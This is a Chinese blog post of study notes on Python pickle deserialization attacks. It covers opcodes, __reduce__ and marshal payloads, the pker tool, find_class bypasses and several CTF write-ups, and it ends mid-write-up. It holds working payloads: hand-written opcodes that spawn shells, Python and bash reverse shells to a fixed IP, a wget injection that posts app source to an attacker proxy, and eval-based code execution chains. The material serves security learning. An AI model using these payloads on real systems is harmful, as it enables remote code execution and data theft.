---
title: "反序列化专题笔记·壹·python篇"
slug: "python-unserialize-notes-01-python"
description: "对于反序列化的认识总是不深刻，所以有了这一系列总结。这是反序列化专题的第一篇，也是python的第一篇。"
date: 2021-08-12T11:48:05+08:00
categories: ["NOTES&SUMMARY"]
series: ["反序列化"]
tags: ["python", "unserialize"]
draft: false
toc: true
---

## 序列化&反序列化

在python中有好几个内置模块都可以干序列化&反序列化这个事，比如[json](https://www.cnblogs.com/gcgc/p/10973418.html#_label2), [pickle](https://www.cnblogs.com/gcgc/p/10973418.html#_label3)/[cpickle](https://docs.python.org/2/library/pickle.html#module-cPickle), [shelve](https://www.cnblogs.com/gcgc/p/10973418.html#_label4), [marshal](https://docs.python.org/zh-cn/3/library/marshal.html)，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。

pickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如

- `None` 、 `True` 和 `False`
- 整数、浮点数、复数
- str、byte、bytearray
- 只包含可封存对象的集合，包括 tuple、list、set 和 dict
- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
- 定义在模块最外层的内置函数
- 定义在模块最外层的类
- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）

当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。

对于一个Object，可以通过重写`object.__reduce__()`函数，使其被序列化时按照重写的方式进行；此函数会返回一个`(callable, ([para1, para2, ...])[, ...])`的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。

pickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。

说到pickle不得不谈的是opcode，即<u>PVM(python virtual machine)</u>的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。

```python
import pickle

a={'1': 1, '2': 2}

for i in range(4):
    print(f'ver_{i}',pickle.dumps(a,protocol=i))

# python3输出 protocol<=5
ver_0: b'(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.'
ver_1: b'}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
ver_2: b'\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
ver_3: b'\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
ver_4: b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.'
ver_5: b'\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.'
```

```python
# python2输出 protocal<=2
ver_0: (dp0
S'1'
p1
I1
sS'2'
p2
I2
s.
ver_1: }q(U1qKU2qKu.
ver_2: �}q(U1qKU2qKu.
```

0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：

| Opcode | Mnemonic    | Description                                       |
| ------ | ----------- | ------------------------------------------------- |
| (      | MARK        | Push a mark object onto the stack                 |
| S      | STRING      | string                                            |
| I      | INT         | Push integer or bool; decimal string argument     |
| l      | LIST        | build a list from topmost stack items             |
| d      | DICT        | build a dict from stack items                     |
| }      | EMPTY_DICT  | Push empty dict                                   |
| t      | TUPLE       | Build a tuple from topmost stack items            |
| )      | EMPTY_TUPLE | Push empty tuple                                  |
| c      | GLOBAL      | Push self.find_class(module, args); 2 string args |
| R      | REDUCE      | Apply callable to argtuple, both on stack         |
| b      | BUILD       | call  `__setstate__` or `__dict__.update()`       |
| i      | INST        | build & push class instance                       |
| o      | OBJ         | build & push class instance                       |
| .      | STOP        | Every pickle ends with STOP                       |

使用**<u>pickletools</u>**可以将opcode转化为肉眼可读取的形式

```python
import pickletools

data=b"\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b'1'\nkey2=b'2'q\x01\x85q\x02Rq\x03."
pickletools.dis(data)

    0: \x80 PROTO      3
    2: c    GLOBAL     'builtins exec'
   17: q    BINPUT     0
   19: X    BINUNICODE "key1=b'1'\nkey2=b'2'"
   43: q    BINPUT     1
   45: \x85 TUPLE1
   46: q    BINPUT     2
   48: R    REDUCE
   49: q    BINPUT     3
   51: .    STOP
highest protocol among opcodes = 2
```

## 可以利用的方向&思路

pickle的应用场景其实很广泛

- 解析认证token, session时；参见：[掌阅iReader某站Python漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)（一个redis+python反序列化的栗子
- 可能将对象pickle后存储成磁盘文件
- 可能将对象pickle后在网络中传输
- 可能会通过参数传递给程序；参见：[sqlmap的代码执行漏洞](https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/)

这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。

构造反序列化的payload离不开`__reduce__`这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：[What are metaclasses in Python?](https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python)）

————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的

![image-20210809005621153](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png)

python3中消除了两者的区别，表现为第二种

![image-20210809005849080](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png)

回到关于`__reduce__`的问题，只要在新式类中定义一个 `__reduce__` 方法，我们就能在序列化的使用让这个类根据我们在`__reduce__` 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个`callable`可调用的对象，一个是` ([para1, para2, ...])[, ...])`，该对象所需的参数元组；最简单的例子是`return (os.system, ('ls',))`。`__reduce__` 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是`__reduce__`的返回值的一个底层实现。

### 此处上一个简单的小栗子

```python
# shell.pickle
cos
system
(S'/bin/sh'
tR.
```

![image-20210809002248690](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png)

上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在`__reduce__`中

```python
# py2
import pickle
import os
class A(object):
    def __reduce__(self):
        a = '/bin/sh'
        return (os.system,(a,))
a = A()
test = pickle.dumps(a)
print test
pickle.loads(test)
```

![image-20210809011024984](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png)

也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的`__reduce__`函数的返回值，我们可以利用它来rce，反弹shell之类的。

### 另一个反弹shell的小栗子

```python
import pickle
import os
class A(object):
    def __reduce__(self):
        a = """python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.29",8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        return (os.system,(a,))
a=A()
result = pickle.dumps(a)
pickle.loads(result)
```

```python
# 或者最简单的手写opcode 不用特意构造class A()
cos
system
(S'bash -c "bash -i >& /dev/tcp/192.168.31.29/8426 0>&1"'
tR.
```

![image-20210809090941558](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png)

参考：[Linux反弹shell（一）文件描述符与重定向](https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/)  |  [Linux 反弹shell（二）反弹shell的本质](https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/)

{{% spoiler "栗子1 - [DasCTF 0721] easyweb" %}}
[之前写过了](https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb)，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行
{{% /spoiler %}}

### 用Marshal序列化任意代码对象

如果只在`__reduce__`中用`-c`参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦

前面提到pickle不能序列化代码对象，来个实例

```python
# py2
import pickle
def foo():
    import os
    def fib(n):
        if n<=1:
            return n
        return fib(n-1)+fib(n-2)
    print 'fib(10)=',fib(10)
    os.system('/bin/sh')
pickle.dumps(foo.func_code)
```

![image-20210809094914448](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png)

但也不是绝路一条，**Marshal**可以让这段代码序列化

```python
# py2
import marshal
import base64

def foo():
    import os
    def fib(n):
        if n <= 1:
            return n
        return fib(n-1) + fib(n-2)
    print 'fib(10) =', fib(10)
    os.system('/bin/sh')

code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
print code_serialized
# YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B
```

现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入`__reduce__`返回部分似乎并不可以，`__reduce__`是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。

————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在`return (os.system,(a,))`这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker

我们需要执行的其实是（利用到python oop的特性，通过`types.FunctionTyle(func_code,globals(),’’)()`来动态地创建匿名函数，参见：[官方文档](https://docs.python.org/zh-cn/3/library/types.html#module-types)）

```python
(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()
```

或者更可读一些

```python
code_str = base64.b64decode(code_enc)
code = marshal.loads(code_str)
func = types.FunctionType(code, globals(), '')
func()
```

接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode

```python
cos
system
(S'/bin/sh'
tR.
```

开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去

```python
cmarshal
loads
(cbase64
b64decode
(S'YwAAAAAB........'
tRtR
```

而globals()可以在`__builtin__`模块中引入

```python
{}{}
c__builtin__
globals
(tR
```

把上面的缝合起来得到最终的payload，注意添加`(rR.`

```python
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAAB........'
tRtRc__builtin__
globals
(tRS''
tR(tR.
```

构造这个人看着费劲的payload的模板~（来源参见：[Arbitrary code execution with Python pickles](https://checkoway.net/musings/pickle/)）

```python
# py2
import marshal
import base64

def foo():
    pass # Your code here

print """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
```

用pickle执行一下那串payload看看效果

![image-20210809094819276](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png)

成功返回了斐波那契数列的结果和一个shell

原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode

```python
import marshal
import base64

def foo():
    import os
    a = 'bash -c "bash -i >& /dev/tcp/192.168.31.29/8426 0>&1"'
    # print 'hold on...'
    os.system(a)
print """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
```

![image-20210810015119794](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png)

————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：[pickle_compiler.py](https://gist.github.com/freddyb/3360650#file-pickle_compiler-py)

```python
try:
    import cPickle as pickle
except ImportError:
    import pickle
from sys import argv

def picklecompiler(sourcefile):
    sourcecode = file(sourcefile).read()
    return "c__builtin__\neval\n(c__builtin__\ncompile\n(%sS'<payload>'\nS'exec'\ntRtR." % (pickle.dumps( sourcecode )[:-4],)

def usage():
    print '''usage: python %s filename''' % argv[0]

if __name__ == "__main__":
    if len(argv) == 2:
        print picklecompiler(argv[1])
    else:
        usage()
```

### 工具二连 - 通过[<u>pker</u>](https://github.com/eddieivan01/pker)构造opcode

原理参见：[通过AST来构造Pickle opcode - 自动化构造](https://xz.aliyun.com/t/7012#toc-5)，利用了抽象语法树

![image-20210809232152276](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png)

pker会用到`GLOBAL`, `INST`, `OBJ`这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）

- 全局变量覆盖

  - ```python
    # 覆盖直接由执行文件引入secret模块中的name和category模块
    ecret = GLOBAL('__main__', 'secret')
    secret.name = '1'
    secret.category = '2'
    ```

  - ```python
    # 覆盖引入模块的变量
    game = GLOBAL('guess_game', 'game')
    game.curr_ticket = '123'
    ```

- 函数执行

  - ```python
    # 通过b'R'调用 __reducce__方法
    s = 'whoami'
    system = GLOBAL('os', 'system')
    system(s)
    return
    ```

  - ```python
    # 通过b'i'调用
    INST('os', 'system', 'whoami')
    ```

  - ```python
    # 通过b'c'和b'o'调用
    OBJ(GLOBAL('os', 'system'), 'whoami')
    ```

  - ```python
    # 多参数调用函数
    INST('[module]', '[callable]'[, param0, param1...])
    OBJ(GLOBAL('[module]', '[callable]')[, param0, param1...])
    ```

- 实例化对象（特殊的函数执行）

  - ```python
    animal = INST('__main__', 'Animal','1','2')
    return animal
    ```

  - ```python
    animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
    return animal
    ```

  - ```python
    animal = INST('__main__', 'Animal')
    animal.name='1'
    animal.category='2'
    return animal
    ```

先对题目有大概思路，然后辅以工具~好耶

### 工具二连 - [<u>anapickle</u>](https://github.com/sensepost/anapickle)

其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~

## bypass!!!

### 对类型的检查

可以在已经构造好的opcode后面去掉`.`再续上相应的对象的opcode，作为栈顶的值供检查

### 限制`b'c'`对模块的引入 - `find_class()`的重写

修改`find_class()`会引入函数&模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用`find_class()`的检查：

- opcode角度：出现`c`, `i`, `b'\x93'`会调用
- python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过`__import__`来绕过）

### -->>仅可以引入`__main__`开头的模块

“通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当`c`指令只允许`__main__`时，我们可以引入`__main__.blue`（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是`{'name': 'rua', 'grade': 'www'}`；之后执行BUILD指令，将会改写`__main__.blue.name`和 `__main__.blue.grade`，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。

既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）

### -->>仅可以引入题目中自设的模块&模块名不能有`__`符

{{% spoiler "栗子2 - [SUCTF 2019]Guess Game" %}}

本地复现还是失败，无解，docker地址->https://github.com/rmb122/suctf2019_guess_game![image-20210809115950444](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png)

![image-20210809130400358](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png)

是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag

然后是game_client.py

![image-20210809130523878](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png)

接收数字的输入作为参数生成Ticket对象，序列化后发送到server端

再看game_server.py，用了重写了的`find_class()`

![image-20210809130933730](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png)

这个限制的意思是导入的模块只能以guess_name开头并且名字里没有`__`

大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例

![image-20210809132300981](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png)

判断输赢则是需要Game辅助

![image-20210809132437175](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png)

结合game_server.py的判断条件，拿到flag需要`self.win_count == max_round == 10`

那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写`find_class()`后对加载指定模块的限制，而这里我们可以看到`__init__.py`中`game = Game()`，所以直接可以通过`guess_game.game`引入`Game()`类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先`from guess_name import game`，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意

![image-20210809140423900](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png)

pickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后

opcodes:

```python
# 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜
cguess_name
game
}S"win_count"
I10
sS"round_count"
I9
sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.
# c之后是被find_class()监控的区域，拼接Ticket
```

```python
import socket
import struct

s = socket.socket()
s.connect(('node4.buuoj.cn', 28803))

exp = b'''cguess_game
game
}S"win_count"
I10
sS"round_count"
I9
sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.'''

s.send(struct.pack('>I', len(exp)))
s.send(exp)

print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
```

![image-20210809144613834](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png)

————用pker

```python
ticket = INST('guess_game.Ticket', 'Ticket', 0)
game = GLOBAL('guess_game', 'game')
game.curr_ticket = ticket
return ticket
# b"(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S'curr_ticket'\ng0\ndtbg0\n."
```
{{% /spoiler %}}



{{% spoiler "栗子3 - [巅峰极客 2021]what_pickle" %}}

登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现

/images可以看到开着的debug界面

![image-20211024174438862](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png)

能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来

```
/images?image=&argv=--post-file=/app/app.py&argv=--execute=http_proxy=http://ip:port
```

```
/images?image=&argv=—post-file=/app/app.py&argv=-e http_proxy=http://ip:port
```

依次读出/app/app.py和/app/config.py

```python
# app.py
from flask import Flask, request, session, render_template, url_for,redirect
import pickle
import io
import sys
import base64
import random
import subprocess
from ctypes import cdll
from config import SECRET_KEY, notadmin,user

cdll.LoadLibrary("./readflag.so")

app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY=SECRET_KEY,
))

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in ['config'] and "__" not in name:
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


@app.route('/')
@app.route('/index')
def index():
    if session.get('username', None):
        return redirect(url_for('home'))
    else:
        return render_template('index.html')

@app.route('/login', methods=["POST"])
def login():
    name = request.form.get('username', '')
    data = request.form.get('data', 'test')
    User = user(name,data)
    session["info"]=base64.b64encode(pickle.dumps(User))
    return redirect(url_for('home'))

@app.route('/home')
def home():
    info = session["info"]
    User = restricted_loads(base64.b64decode(info))
    Jpg_id = random.randint(1,5)
    return render_template('home.html',id = str(Jpg_id), info = User.data)


@app.route('/images')
def images():
    command=["wget"]
    argv=request.args.getlist('argv')
    true_argv=[x if x.startswith("-") else '--'+x for x in argv]
    image=request.args['image']
    command.extend(true_argv)
    command.extend(["-q","-O","-"])
    command.append("http://127.0.0.1:8080/"+image)
    image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    return image_data.stdout



if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=80)
```

```python
# config.py
SECRET_KEY="On_You_fffffinddddd_thi3_kkkkkkeeEEy"

notadmin={"admin":"no"}

class user():
    def __init__(self, username, data):
        self.username = username
        self.data = data

def backdoor(cmd):
    if isinstance(cmd,list) and notadmin["admin"]=="yes":
        s=''.join(cmd)
        eval(s)
```

这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数`eval()`

```python
# 用pker.py生成payload
s=GLOBAL("config","notadmin")
s["admin"]="yes"
user=INST("config","user")
user.username="tyskill"
user.data="tyskill"
door=INST("config","backdoor",["__import__('subprocess').call(\"echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/you_vps_ip/port 0>&1'>x && bash x && rm -rf x\",shell=True)"])
return user
```

然后`base64.b64encode(data)`加进`session['info']`中拿到shell

看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp->[wp1](https://juejin.cn/post/6994717395298287624)  |  [wp2](https://ctf.njupt.edu.cn/663.html#what_pickle)

{{% /spoiler %}}

### -->>仅可以引入`builtins`模块

![img](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png)

更多知识参考：[深入理解Python中的`__builtin__`和`__builtins__`](https://blog.51cto.com/xpleaf/1764849)  |  [Python 的内建对象](https://www.jianshu.com/p/645e973 83c1f)  |  [`__builtins__` 与 `__builtin__`（builtins）](https://zhuanlan.zhihu.com/p/125693125)

{{% spoiler "栗子4 - [Code-Breaking 2018] picklecode" %}}
本地复现还是失败，docker地址->https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了

审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app

看core下的settings.py比默认的配置多了54和55行

![image-20210809152122940](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png)

用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看

![image-20210809152317363](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png)

依旧是重写了`find_class()`方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py

![image-20210809153617320](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png)

模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链

（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）`{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}`，注册一个名为这个的用户即可获得签名的密钥。

再掉头回去思考opcode的编写。重写`find_class()`之后限制很多，但通过builtins仍然可以用`getattr()`；那么就分两步走，先通过`builtins.getattr('builtins, 'eval')`来获取`eval()`，再执行代码。那么如何手写protocol=0的opcode捏？

首先引入模块builtins和函数getattr

```python
cbuiltins
getattr
```

然后需要获取当前的上下文，用globals()

```python
cbuiltins
globals
```

globals是个字典，所以还要获取dict这个对象

```python
cbuiltins
dict
```

还要执行globals()获取完整上下文

```python
cbuiltins
globals
(tR
```

栈顶元素是builtins.globals，压入一个空元组`(t`，然后用`R`执行

然后用dict.get()方法从globals的字典中拿到键名为builtions的值

```python
cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tR.
```

反序列化后得到builtins对象`<module 'builtins' (built-in)>`；之后再用getattr从builtins对象中取出eval，也就是再套一层娃

```python
cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRS'eval'
tR.
```

`<built-in function eval>`现在已经拿到了eval对象，再执行代码

```python
cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRS'eval'
tR(S'__import__("os").system("ls")'
tR.
```

![image-20210809172045469](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png)

成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）

————用pker

```python
getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = getattr(dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = globals()
__builtins__ = dict_get(builtins, '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__("os").system("whoami")')
return
# b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
```

参考：[wp1](https://www.redmango.top/article/64)  |  [Code-Breaking中的两个Python沙箱](https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html)  |  [Python 格式化字符串漏洞（Django为例）](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)
{{% /spoiler %}}

### -->>仅可以引入`sys`模块&名字中不带`.`点号

{{% spoiler "栗子5 - [BalsnCTF 2019] Pyshv1" %}}
题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1

审计一下源码，先看一下肯定会不secure的securePickle.oy

![image-20210811212055295](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png)

重写`find_class()`，被调用时可以灵活添加白名单；再看看server.py

![image-20210811211736904](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png)

将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块

但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃`sys.modules['sys']=sys.modules`。那么如果我们先从sys中引入modules: `import modules from sys`，然后将`modules['sys']`改为`modules['os']`就将成功引入os模块。

但有个缺陷是modules为dict，需要用`getattr(sys.modules[module], name)`进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改

pker

```
modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('dir')
return
```

opcode:

```
b"csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR."
```

![image-20210811215300764](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png)
{{% /spoiler %}}

### -->>仅可以引入题目中自设空模块

{{% spoiler "栗子6 - [BalsnCTF 2019] Pyshv2" %}}
题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2

`find_class()`稍有区别，在`getattr()`之前先用了`__import__()`

